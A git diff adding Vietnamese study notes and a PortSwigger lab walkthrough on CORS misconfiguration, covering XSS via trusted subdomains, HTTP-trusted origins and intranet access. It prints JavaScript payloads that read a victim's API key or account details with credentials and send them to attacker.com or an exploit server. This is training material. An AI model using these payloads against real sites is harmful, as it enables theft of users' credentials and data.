@@ -338,7 +338,7 @@
 
   <img width="1919" height="930" alt="image" src="https://github.com/user-attachments/assets/c1fdb894-5ec0-40b5-88d7-11daba480cf9" />
 
-  Tuy nhiên có thể thấy ở đây, trong response phản hồi của server ta sẽ không thấy header _Access-Control-Allow-Origin_ trả về &rarr; có vè chặn, sử dụng whitelist.
+  Tuy nhiên có thể thấy ở đây, trong response phản hồi của server ta sẽ không thấy header _Access-Control-Allow-Origin_ trả về &rarr; có vè chặn, sử dụng   whitelist.
 
 - Tuy nhiên nếu ta thay đổi giá trị của header này là null, với cách như đã đề cập ở trên để test phản hồi của server:
 
@@ -375,8 +375,195 @@
 
   Thành công thu được API key của admin: _84bjdoMis0cO1vCeZAW4jnMMCBbtIU34_
 
+--- 
 
+### Exploiting XSS via CORS trust relationships
+
+- CORS cho phép origin A đọc dữ liệu từ origin B nếu B tin tưởng A.
+
+- Server của ```vulnerable-website.com``` thể hiện “tin tưởng” bằng cách trả header:
+
+  ```yaml
+  Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com
+  Access-Control-Allow-Credentials: true
+  ```
+
+- Lỗ hổng xảy ra khi: Domain được trust (subdomain.vulnerable-website.com) lại bị dính XSS. Tức ta có thể inject JS chạy trực tiếp trên domain đó.
+
+- Giả sử ta gửi link cho nạn nhân:
+
+  ```url
+  https://subdomain.vulnerable-website.com/?xss=<script>steal()</script>
+  ```
+
+- Khi nạn nhân bấm link:
+
+  - Trình duyệt tải trang từ ```subdomain.vulnerable-website.com```.
   
+  - JS độc của attacker chạy trực tiếp trong context của subdomain.vulnerable-website.com &larr; đây là điểm mấu chốt.
+  
+  - Vì JS đang chạy trên đúng origin được whitelist bởi CORS, nên browser sẽ cho phép script này đọc dữ liệu từ vulnerable-website.com:
+ 
+  ```javascript
+  function steal() {
+    fetch('https://vulnerable-website.com/api/requestApiKey', {
+        credentials: 'include'
+    })
+    .then(r => r.text())
+    .then(data => {
+        // Gửi dữ liệu ăn cắp được về server attacker
+        fetch('https://attacker.com/log?key=' + encodeURIComponent(data))
+    });
+  }
+  ```
+
+---
+
+### Breaking TLS with poorly configured CORS
+
+- Ví dụ, một ```vulnerable-website.com``` dùng HTTPS rất nghiêm ngặt, tất cả endpoint chính đều qua https://. Tuy nhiên, nó cấu hình CORS cho phép truy cập từ một subdomain sử dụng HTTP thường: ```http://trusted-subdomain.vulnerable-website.com```
+
+- Dưới dây là cách ta có thể khai thác:
+
+  - Victim đang lướt web bình thường, gửi một request HTTP (không phải HTTPS) — ví dụ vào một trang http://example.com.
+ 
+  - Attacker (đang MITM) chặn request này và chèn vào một lệnh redirect sang: ```http://trusted-subdomain.vulnerable-website.com```
+
+  - Trình duyệt victim truy cập subdomain này qua HTTP (không mã hoá).
+
+  - Attacker tiếp tục MITM, giả mạo response từ subdomain đó, trong response chứa JavaScript chạy CORS:
+ 
+    ```javascript
+    fetch('https://vulnerable-website.com/api/requestApiKey', {
+    credentials: 'include'
+    })
+    .then(r => r.text())
+    .then(data => fetch('https://attacker.com/log?key=' + data));
+    ```
+
+  - Khi JS này chạy, trình duyệt gửi request cross-origin đến kèm cookie session thật của victim:
+
+    ```url
+    https://vulnerable-website.com/api/requestApiKey
+    ```
+
+  - Server hợp lệ (vì thấy Origin: _http://trusted-subdomain.vulnerable-website.com_ là nằm trong whitelist) nên trả về dữ liệu nhạy cảm (API key...) &rarr; ta đọc được.
+
+### Lab: CORS vulnerability with trusted insecure protocols
+
+- Tương tự các bài lab trước, sau khi đăng nhập thành công vào website, check Burp ta có thể thấy có AJAX request /accountDetails và response trả về có header ```Access-Control-Allow-Credentials```:
+
+  <img width="1408" height="620" alt="Screenshot 2025-09-17 152703" src="https://github.com/user-attachments/assets/42669993-f764-48bb-b438-5be536ff46b6" />
+
+  &rarr; có sử dụng cơ chế CORS.
+
+- Chuyển request vào trong Burp Repeater.
+
+- Thực hiện thử thêm header Origin sau đó nhập giá trị là thêm ```subdomain``` (hoặc bất kỳ từ tùy ý nào) ở trước domain chính hiện tại:
+
+  ```http
+  Origin: https://subdomain.0a1100390460657a80ed0381006200b6.web-security-academy.net
+  ```
+
+  <img width="1919" height="877" alt="image" src="https://github.com/user-attachments/assets/93f6f585-131d-410e-92d1-19249e5bc3b4" />
+
+  Ta có thể thấy response trả về xuất hiện header ```Access-Control-Allow-Origin: https://subdomain.0a1100390460657a80ed0381006200b6.web-security-academy.net```, tức là subdomain    trên có trong whitelist của server website.
+
+  Thử bỏ giao thức HTTPS và thay bằng HTTP thường, ta thấy response trả về vẫn được với header ```Access-Control-Allow-Origin```:
+
+  <img width="1919" height="923" alt="image" src="https://github.com/user-attachments/assets/16204cc7-010a-4e4e-96d4-a8e677b44e02" />
+
+  &rarr; Cấu hình CORS cho phép truy cập từ bất kỳ subdomain tùy ý của domain chính, kể cả HTTPS hay HTTP.
+
+- Vấn đề bây giờ cần tìm một lỗ hổng XSS để có thể inject mã JS độc hại.
+
+- Trong trang chủ các sản phẩm của web shop, chọn một sản phẩm bất kỳ và chọn _Check stock_, ta có thể thấy nó được load sử dụng một HTTP URL trên một subdomain của domain chính web shop:
+
+  <img width="1919" height="936" alt="image" src="https://github.com/user-attachments/assets/beeb2b45-b291-4b3e-ae7f-e476b050dc69" />
+
+- Trong Burp, kiểm tra request _Check stock_, ta nhận thấy có hai param được truyền vào là _prroductId_ và _storeId_
+
+- Thực hiện, chuyển request vào trong Burp Repeater và sửa giá trị của param _productId_ là payload XSS như sau:
+
+  ```html
+  <script>alert(1)</script>
+  ```
+
+  Sau đó gửi request và kiểm tra response của server, ta thấy payload được reflect lại trong response như sau:
+
+  <img width="1919" height="825" alt="Screenshot 2025-09-17 155311" src="https://github.com/user-attachments/assets/a82161ef-8271-4054-b070-8512823caa74" />
+
+  Thực hiện copy URL response, sau đó paste lên trên trình duyệt, kết quả ta có thể thấy payload XSS đã được kích hoạt:
+
+  <img width="1919" height="933" alt="Screenshot 2025-09-17 155507" src="https://github.com/user-attachments/assets/7388674e-ec18-4787-909a-79b8b17be1dd" />
+
+  &rarr; param _productId_ trong request _Check stock_ có lỗ hổng XSS.
+
+  &rarr; Ta cần lợi dụng lỗ hổng XSS này trên subdomain ```http://stock.main_domain....``` để khai thác lỗ hổng CORS.
+
+- Trong exploit server, tại file /exploit ở phần body ta tạo một payload HTML như sau (do trong phạm bị bài lab ta không thể tạo một cuộc tấn công MITM tới nạn nhân):
+
+  ```html
+  <script>
+    document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?
+        productId=<script>
+            var req = new XMLHttpRequest(); 
+            req.onload = reqListener; 
+            req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); 
+            req.withCredentials = true;
+            req.send();
+            function reqListener() {
+                location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+this.responseText;
+            };
+        %3c/script>
+        &storeId=1"
+  </script>
+  ```
+
+  Khi gửi đường dẫn độc hại này cho victim là admin, admin thực click vào đường dẫn, sẽ tự động redirect bằng ```document.location``` tới subdomain         ```http://stock.0a1100390460657a80ed0381006200b6.web-security-academy.net```, nơi chứa lỗ hổng XSS tại param ```productId```.
+
+  Ta tạo một mã JS độc hại tương tự như hai bài lab trên trong param ```productId```, lúc này trình duyệt sẽ tạo một HTTP request từ subdomain chứa lỗ      hổng XSS tới domain chính tại endpoint /accountDetails đang có CORS lỏng lẻo.
+
+  Lúc này server sẽ trả về response tới exploit server vì chính sách whitelist subdomain như đã đề cập ở trên &rarr; lụm lúa.
+
+  <img width="1919" height="938" alt="image" src="https://github.com/user-attachments/assets/4214e494-33d1-4237-ba48-e969d4d73773" />
+
+  Sau khi gửi đường dẫn cho victim, kiểm tra acess log của exploit server:
+
+  <img width="1919" height="928" alt="image" src="https://github.com/user-attachments/assets/28cfd126-ce1a-4c95-a4bf-1e8cbac1ea0f" />
+
+  &rarr; Thành công khai thác CORS thu được dữ liệu nhạy cảm của admin.
+
+---
+
+### Intranets and CORS without credentials
+
+- Bình thường, CORS có ```Access-Control-Allow-Credentials: true``` thì browser mới đính kèm session cookies / token của người dùng.
+
+- Nhưng điều này chỉ đúng với web public mà ta có thể truy cập.
+
+- Còn trong case đặc biệt như Intranet = hệ thống web nội bộ, chỉ truy cập được từ mạng công ty hoặc IP riêng (192.168.x.x, 10.x.x.x...). Ta từ Internet không thể truy cập trực tiếp intranet site.
+
+- Nhưng nếu attacker dụ một nhân viên trong mạng nội bộ truy cập trang của mình (evil.com):
+
+  - Evil.com có thể dùng JS gửi ```fetch("http://intranet.company.local/data")```.
+
+  - Browser nạn nhân sẽ gửi request đó đến intranet, intranet site thường là open (không yêu cầu đăng nhập) &rarr; không cần gửi cả credentials.
+
+- Nếu intranet server trả về:
+
+  ```
+  Access-Control-Allow-Origin: *
+  ```
+
+  thì trình duyệt sẽ cho phép JavaScript của evil.com đọc response, dù: _không có credentials, không cần Access-Control-Allow-Credentials: true_
+
+  &rarr; lấy được dữ liệu nhạy cảm/nội bộ.
+
+
+                                                                                                                              
+
+
   
   
 
